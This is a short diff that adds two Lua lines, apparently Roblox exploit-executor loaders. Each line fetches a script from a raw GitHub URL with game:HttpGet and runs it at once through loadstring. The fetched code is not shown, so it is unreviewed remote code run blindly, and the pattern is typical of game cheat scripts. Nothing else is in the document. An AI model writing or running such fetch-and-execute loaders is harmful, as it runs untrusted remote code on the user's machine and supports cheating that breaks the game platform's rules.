@@ -1,0 +1,2 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/MadGics/Madgics/main/Exe")()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/OneBloxMan'),true))()
